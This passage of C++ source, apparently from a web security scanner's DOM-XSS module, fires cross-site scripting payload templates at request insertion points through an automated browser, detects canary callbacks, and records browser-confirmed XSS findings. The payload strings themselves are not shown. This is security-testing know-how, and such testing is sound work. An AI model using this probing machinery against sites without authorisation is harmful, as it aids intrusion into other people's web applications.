                else if (scheme == "http" && (port == 443 || port == 0)) port = 80;
            }
        }
    }

    std::string abs_url = assemble_url_from_built(built, scheme, port);
    if (abs_url.empty()) {
        out.error = "could not assemble absolute url from built request";
        set_err(out.error);
        return out;
    }

    camoufox::reset_browser_state();

    uint64_t t0 = now_ms_steady();
    bool ok = false;
    if (ip.kind == "query" || ip.kind == "path") {
        ok = navigate_with_init_script(abs_url, s, per_payload_timeout_ms);
    } else {
        ok = drive_fetch_harness(abs_url, built, s, per_payload_timeout_ms);
    }
    if (!ok) {
        out.error = current_err();
        return out;
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(300));

    out.sink_log = read_results(s);
    if (out.sink_log.empty()) {
        std::string e = current_err();
        if (is_browser_transport_error(e)) {
            out.error = e;
            return out;
        }
    }
    out.canary_fired = !out.sink_log.empty();
    out.ok = true;
    if (out.canary_fired) clear_err();

    if (out.canary_fired && capture_screenshot) {
        std::string sp = make_screenshot_path(s.token.substr(0, 8));
        if (camoufox::take_screenshot(sp, true)) {
            out.last_screenshot_path = sp;
        }
    }

    uint64_t elapsed = now_ms_steady() - t0;
    diag::log_tagged_fmt("dom_xss", "fire_payload kind=%s param=%s fired=%d sinks=%zu elapsed=%llums",
                         ip.kind.c_str(), ip.name.c_str(),
                         out.canary_fired ? 1 : 0,
                         out.sink_log.size(),
                         static_cast<unsigned long long>(elapsed));
    return out;
}

size_t scan_insertion_point(const insertion_point_t& ip, const scan_options_t& opts)
{
    diag::log_tagged_fmt("dom_xss", "scan_insertion_point entry kind=%s param=%s host=%s",
        ip.kind.c_str(), ip.name.c_str(), opts.host.c_str());
    clear_err();
    if (opts.cancelled && opts.cancelled()) {
        set_err("DOM-XSS scan cancelled");
        return 0;
    }
    if (opts.deadline_ms != 0 && now_ms_steady() >= opts.deadline_ms) {
        set_err("DOM-XSS scan deadline exceeded");
        return 0;
    }
    if (!camoufox::ensure_ready()) {
        diag::log_tagged("dom_xss", "scan_insertion_point: camoufox not ready, skipping");
        set_err("camoufox bridge not ready");
        return 0;
    }
    last_scan_ms().store(now_ms_wall());
    sentinel_t s = make_sentinel();

    std::vector<payload_set_t> all = default_payload_sets();
    std::vector<const payload_set_t*> active;
    for (auto& set : all) {
        if (set.name == "polyglot" && opts.include_polyglot) active.push_back(&set);
        else if (set.name == "standard" && opts.include_standard) active.push_back(&set);
        else if (set.name == "dom_only" && opts.include_dom_only) active.push_back(&set);
    }
    if (active.empty()) {
        diag::log_tagged_fmt("dom_xss", "scan_insertion_point no_active_sets");
        return 0;
    }

    std::string path_hint;
    {
        std::vector<uint8_t> probe_built = ip.build ? ip.build(std::string()) : std::vector<uint8_t>();
        if (!probe_built.empty()) {
            std::string raw(reinterpret_cast<const char*>(probe_built.data()), probe_built.size());
            auto rl = parse_request_line_local(raw);
            if (rl.valid) path_hint = rl.uri;
        }
    }

    diag::log_tagged_fmt("dom_xss", "scan_insertion_point active_sets=%zu path_hint=%s", active.size(), path_hint.c_str());
    size_t fired = 0;
    size_t issued = 0;
    size_t budget = opts.max_payloads_per_point;
    if (budget == 0) budget = 16;
    if (budget > 64) budget = 64;
    size_t browser_failures = 0;
    size_t max_browser_failures = opts.max_browser_failures == 0 ? 1 : opts.max_browser_failures;

    for (const auto* set : active) {
        if (fired >= budget) break;
        for (const auto& tpl : set->templates) {
            if (fired >= budget) break;
            if (opts.cancelled && opts.cancelled()) {
                set_err("DOM-XSS scan cancelled");
                diag::log_tagged_fmt("dom_xss", "scan_insertion_point cancelled kind=%s param=%s fired=%zu issued=%zu",
                    ip.kind.c_str(), ip.name.c_str(), fired, issued);
                return issued;
            }
            if (opts.deadline_ms != 0 && now_ms_steady() >= opts.deadline_ms) {
                set_err("DOM-XSS scan deadline exceeded");
                diag::log_tagged_fmt("dom_xss", "scan_insertion_point deadline kind=%s param=%s fired=%zu issued=%zu",
                    ip.kind.c_str(), ip.name.c_str(), fired, issued);
                return issued;
            }
            ++fired;
            auto r = fire_payload(ip, tpl, s, opts.capture_screenshots, opts.per_payload_timeout_ms,
                                  opts.scheme, opts.port);
            if (!r.ok) {
                std::string e = r.error.empty() ? current_err() : r.error;
                if (is_browser_transport_error(e)) {
                    ++browser_failures;
                    if (e.empty()) e = "DOM-XSS browser execution failed";
                    set_err(e);
                    diag::log_tagged_fmt("dom_xss", "scan_insertion_point browser_abort kind=%s param=%s failures=%zu fired=%zu error=%s",
                        ip.kind.c_str(), ip.name.c_str(), browser_failures, fired, e.c_str());
                    if (opts.abort_on_browser_error || browser_failures >= max_browser_failures) return issued;
                }
                continue;
            }
            if (!r.canary_fired) continue;
            std::string type_key = (set->name == "dom_only") ? "xss.dom_browser_confirmed"
                                                              : "xss.reflected_browser_confirmed";
            std::string title = (set->name == "dom_only")
                ? std::string("Cross-Site Scripting (DOM, browser-confirmed)")
                : std::string("Cross-Site Scripting (browser-confirmed)");
            std::string payload = replace_all(tpl, "{CANARY_FN_LIT}", js_string_literal(s.canary_fn));
            payload = replace_all(payload, "{CANARY_FN}", s.canary_fn);
            payload = replace_all(payload, "{CANARY}", s.token);
            auto iss = make_browser_certain_issue(type_key, title, ip, payload, r, opts, path_hint);
            issue_store::add(std::move(iss));
            ++issued;
            diag::log_tagged_fmt("dom_xss", "scan_insertion_point confirmed kind=%s param=%s type=%s issued=%zu",
                ip.kind.c_str(), ip.name.c_str(), type_key.c_str(), issued);
            return issued;
        }
    }
    diag::log_tagged_fmt("dom_xss", "scan_insertion_point done fired=%zu issued=%zu", fired, issued);
    return issued;
}

bool confirm_reflected_in_browser(const std::string&        url,
                                  const std::string&        canary_marker,
                                  std::vector<std::string>& out_sink_log,
                                  int                       per_payload_timeout_ms)
{
    diag::log_tagged_fmt("dom_xss", "confirm_reflected_in_browser entry url=%s canary=%s timeout_ms=%d",
        url.c_str(), canary_marker.c_str(), per_payload_timeout_ms);
    std::lock_guard<std::mutex> global_lk(browser_global_mtx());
    out_sink_log.clear();
    if (!camoufox::ensure_ready()) {
        diag::log_tagged_fmt("dom_xss", "confirm_reflected_in_browser camoufox_not_ready");
        return false;
    }
    if (url.empty()) {
        diag::log_tagged_fmt("dom_xss", "confirm_reflected_in_browser empty_url");
        return false;
    }

    sentinel_t s = make_sentinel();
    if (!canary_marker.empty()) {
        s.token = canary_marker;
    }
    camoufox::reset_browser_state();
    if (!navigate_with_init_script(url, s, per_payload_timeout_ms)) {
        diag::log_tagged_fmt("dom_xss", "confirm_reflected_in_browser navigate_failed url=%s", url.c_str());
        return false;
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(250));
    out_sink_log = read_results(s);
    diag::log_tagged_fmt("dom_xss", "confirm_reflected_in_browser done url=%s fired=%d sinks=%zu",
        url.c_str(), !out_sink_log.empty() ? 1 : 0, out_sink_log.size());
    return !out_sink_log.empty();
}

bool initialize()
{
    diag::log_tagged_fmt("dom_xss", "initialize entry");
    bool expected = false;
    if (!initialized_flag().compare_exchange_strong(expected, true)) {
        diag::log_tagged_fmt("dom_xss", "initialize already_initialized");
        return true;
    }
    diag::log_tagged("dom_xss", "engine initialized");
    return true;
}

void shutdown()
{
    diag::log_tagged_fmt("dom_xss", "shutdown entry");
    initialized_flag().store(false);
    diag::log_tagged_fmt("dom_xss", "shutdown done");
}

std::string last_error()
{
    std::lock_guard<std::mutex> lk(err_mtx());
    std::string e = err_slot();
    diag::log_tagged_fmt("dom_xss", "last_error queried val=%s", e.c_str());
    return e;
}

}
}
}
